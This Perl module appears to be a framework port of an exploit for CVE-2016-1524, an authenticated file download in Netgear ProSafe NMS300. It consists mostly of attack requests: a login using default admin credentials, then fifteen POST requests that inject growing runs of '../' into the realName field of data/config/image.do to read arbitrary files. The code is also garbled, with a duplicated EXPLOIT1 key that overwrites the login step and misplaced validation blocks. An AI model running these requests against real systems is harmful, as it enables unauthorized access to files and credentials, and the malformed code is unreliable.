package NETGEAR::MSF::NetgearAuthDownload;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "NetgearAuthDownload";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "CVE" => "CVE-2016-1524",
  "DESCRIPTION" => "

        Netgear's ProSafe NMS300 is a network management utility that runs on Windows systems.

        The application has a file download vulnerability that can be exploited by an

        authenticated remote attacker to download any file in the system.

        This module has been tested with versions 1.5.0.2, 1.4.0.17 and 1.1.0.13.

      ",
  "METHOD" => "POST",
  "MSF_MODULE" => "netgear_auth_download",
  "PASSWORD FOR THE SPECIFIED USERTITLE" => "admin",
  "PATH" => "userSession.do?method=login&method=loginAgain&method=add&method=getPageList&type=configImgManager&",
  "PATHS" => [
    "userSession.do",
    "userSession.do",
    "data/config/image.do",
    "data/getPage.do",
    "Windows/System32/calc.exe",
  ],
  "PAYLOAD" => "everyPage=__EVERYPAGE__&",
  "REFERENCES" => [
    "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear_nms_rce.txt",
    "http://seclists.org/fulldisclosure/2016/Feb/30",
  ],
  "THE USERTITLE TO LOGIN AS" => "admin",
  "TITLE" => "NETGEAR ProSafe Network Management System 300 Authenticated File Download",
  VARIABLES => {
    'PASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'DESCRIPTION' =>       { DESCRIPTION => "", VALUE => "" },
    'REALNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'EVERYPAGE' =>       { DESCRIPTION => "", VALUE => "" },
    'DEVICEMODEL' =>       { DESCRIPTION => "", VALUE => "" },
    'FILENAME' =>       { DESCRIPTION => "", VALUE => "" },
    'SINGLEID' =>       { DESCRIPTION => "", VALUE => "" },
    'TARGETURI' =>       { DESCRIPTION => "", VALUE => "" },
    'DEVICETYPE' =>       { DESCRIPTION => "", VALUE => "" },
    'VERSION' =>       { DESCRIPTION => "", VALUE => "" },
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'VENDOR' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "Path of the file to download minus the drive letter",
  VALUE => "/Windows/System32/calc.exe",
},
  },
      },  VALIDATION => {
    'TREGEX' =>       "\"imageId\":\"\\([0-9]*\\)\",\"fileName\":\"\"",
    'TSTRING' =>       "\"success\":true",

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'userSession.do',
      PAYLOAD      => 'userName=__USERNAME__&password=__PASSWORD__',
      TEXT   => 'Sending Exploit #1 Request : [POST] /userSession.do',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'data/config/image.do',
      PAYLOAD      => 'realName=__INCLUSION__&md5=&fileName=6E05l1u21p5Wfc7YG.img&version=iwhjud8Yu&vendor=S2uwJI&deviceType=707&deviceModel=L7RYX&description=2rpK6HybXlMjpBwHv',
      TEXT   => 'Sending Exploit #1 Request : [POST] /data/config/image.do',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'data/config/image.do',
      PAYLOAD      => 'realName=..__INCLUSION__&md5=&fileName=5fXIqE2Vuo.img&version=mqRGxZgs&vendor=TKMi&deviceType=592&deviceModel=kQFnx&description=zIdEv8Cu1',
      TEXT   => 'Sending Exploit #2 Request : [POST] /data/config/image.do',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT3 => {
      METHOD       => 'POST',
      PATH   => 'data/config/image.do',
      PAYLOAD      => 'realName=../..__INCLUSION__&md5=&fileName=82temmJ1.img&version=8XXPCA3u&vendor=Ykkig&deviceType=1&deviceModel=cKlXFf&description=8ZXrkMGv',
      TEXT   => 'Sending Exploit #3 Request : [POST] /data/config/image.do',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT4 => {
      METHOD       => 'POST',
      PATH   => 'data/config/image.do',
      PAYLOAD      => 'realName=../../..__INCLUSION__&md5=&fileName=Bcb1Fy1GvHO.img&version=3WwW9iiDm&vendor=wdZvgV&deviceType=15&deviceModel=n1AgXc&description=umCCooGm',
      TEXT   => 'Sending Exploit #4 Request : [POST] /data/config/image.do',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT5 => {
      METHOD       => 'POST',
      PATH   => 'data/config/image.do',
      PAYLOAD      => 'realName=../../../..__INCLUSION__&md5=&fileName=CKEoqeLdLkWZmbL.img&version=yJeGVwR3l&vendor=u5gz&deviceType=298&deviceModel=eWYFhAn&description=GzVqNghrLq5Kk',
      TEXT   => 'Sending Exploit #5 Request : [POST] /data/config/image.do',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT6 => {
      METHOD       => 'POST',
      PATH   => 'data/config/image.do',
      PAYLOAD      => 'realName=../../../../..__INCLUSION__&md5=&fileName=chtpqWIrZdFLqRsx.img&version=o2QnZhRI&vendor=v0y4p&deviceType=417&deviceModel=4qg0Ey6&description=PYXArn7rJLGJC',
      TEXT   => 'Sending Exploit #6 Request : [POST] /data/config/image.do',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT7 => {
      METHOD       => 'POST',
      PATH   => 'data/config/image.do',
      PAYLOAD      => 'realName=../../../../../..__INCLUSION__&md5=&fileName=4Iq4HSkhKwt0s.img&version=NmJVTdIOR&vendor=mrLAo&deviceType=830&deviceModel=ThfFY&description=Q1mNbYzejxZCg0KZ6',
      TEXT   => 'Sending Exploit #7 Request : [POST] /data/config/image.do',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT8 => {
      METHOD       => 'POST',
      PATH   => 'data/config/image.do',
      PAYLOAD      => 'realName=../../../../../../..__INCLUSION__&md5=&fileName=ueQDVTJT5Ko.img&version=YI4J7J1Jr&vendor=7Qvwg&deviceType=923&deviceModel=MugFAwq&description=3aeIIqj3N7gHa',
      TEXT   => 'Sending Exploit #8 Request : [POST] /data/config/image.do',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT9 => {
      METHOD       => 'POST',
      PATH   => 'data/config/image.do',
      PAYLOAD      => 'realName=../../../../../../../..__INCLUSION__&md5=&fileName=0DjXMcQjEsD.img&version=A3x94QMNc&vendor=4DK9&deviceType=566&deviceModel=DCD2U&description=e7I1jVYPRAl',
      TEXT   => 'Sending Exploit #9 Request : [POST] /data/config/image.do',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT10 => {
      METHOD       => 'POST',
      PATH   => 'data/config/image.do',
      PAYLOAD      => 'realName=../../../../../../../../..__INCLUSION__&md5=&fileName=mU5bsSfQ7OU.img&version=x8MJcsnnG&vendor=609OuV&deviceType=160&deviceModel=oSM3HUi&description=jbyyolEPm7cx4ii',
      TEXT   => 'Sending Exploit #10 Request : [POST] /data/config/image.do',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT11 => {
      METHOD       => 'POST',
      PATH   => 'data/config/image.do',
      PAYLOAD      => 'realName=../../../../../../../../../..__INCLUSION__&md5=&fileName=gUc6RIIqrd.img&version=S035oXrZ&vendor=EcZS&deviceType=478&deviceModel=Zssvs&description=bdGRMdMDR7xCYe',
      TEXT   => 'Sending Exploit #11 Request : [POST] /data/config/image.do',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT12 => {
      METHOD       => 'POST',
      PATH   => 'data/config/image.do',
      PAYLOAD      => 'realName=../../../../../../../../../../..__INCLUSION__&md5=&fileName=tlCXmZXy5i.img&version=W8LUe4GRl&vendor=vJ0v&deviceType=714&deviceModel=nTcSOLv&description=Kr1JNM2MhKBB8NYA',
      TEXT   => 'Sending Exploit #12 Request : [POST] /data/config/image.do',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT13 => {
      METHOD       => 'POST',
      PATH   => 'data/config/image.do',
      PAYLOAD      => 'realName=../../../../../../../../../../../..__INCLUSION__&md5=&fileName=t5n4WDZb0x4.img&version=iRAFJGs8G&vendor=Hv9WUr&deviceType=315&deviceModel=mjMPOme&description=czA1HQMhNJwjw',
      TEXT   => 'Sending Exploit #13 Request : [POST] /data/config/image.do',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT14 => {
      METHOD       => 'POST',
      PATH   => 'data/config/image.do',
      PAYLOAD      => 'realName=../../../../../../../../../../../../..__INCLUSION__&md5=&fileName=OD1TQp5nzEIm.img&version=z5RvDMvbr&vendor=KmWf&deviceType=392&deviceModel=WNaic&description=Fucn6ViMUY1judCid',
      TEXT   => 'Sending Exploit #14 Request : [POST] /data/config/image.do',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT15 => {
      METHOD       => 'POST',
      PATH   => 'data/config/image.do',
      PAYLOAD      => 'realName=../../../../../../../../../../../../../..__INCLUSION__&md5=&fileName=mX97KBZsuUc.img&version=xFEbGkGA&vendor=2GCZo&deviceType=789&deviceModel=fD5Cq&description=3ubjbf3pmMte7Ln',
      TEXT   => 'Sending Exploit #15 Request : [POST] /data/config/image.do',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
